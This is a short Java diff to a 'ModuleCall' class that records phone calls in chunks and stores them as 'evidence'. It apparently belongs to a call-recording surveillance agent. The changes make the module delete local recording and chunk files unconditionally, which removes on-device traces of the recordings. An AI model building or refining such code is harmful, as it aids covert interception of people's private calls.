@@ -505,12 +505,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				EvidenceBuilder.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
 			}
 
-			if (!Cfg.DEBUG) {
-				// Check.log(TAG + " (saveCallEvidence): deleting file: " +
-				// file);
-				file.delete();
-			}
-
+			file.delete();
 			return true;
 		} else {
 			return false;
@@ -697,6 +692,11 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 
 			callInfo = new CallInfo();
+			for (Chunk chunk : chunks) {
+				AutoFile filetmp = new AutoFile(chunk.encodedFile);
+				filetmp.delete();
+			}
+
 			chunks = new ArrayList<Chunk>();
 			finished = new boolean[2];
 			started = false;
@@ -765,7 +765,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 						for (Chunk chunk : chunks) {
 							if (chunk.end.getTime() < firstl.begin.getTime()) {
-								AutoFile filetmp = new AutoFile(encodedFile);
+								AutoFile filetmp = new AutoFile(chunk.encodedFile);
 								filetmp.delete();
 								if (Cfg.DEBUG) {
 									Check.log(TAG + " (encodeChunks):removing old LOCAL chunk !! :" + filetmp.getName() + " StreamId:" + streamId);
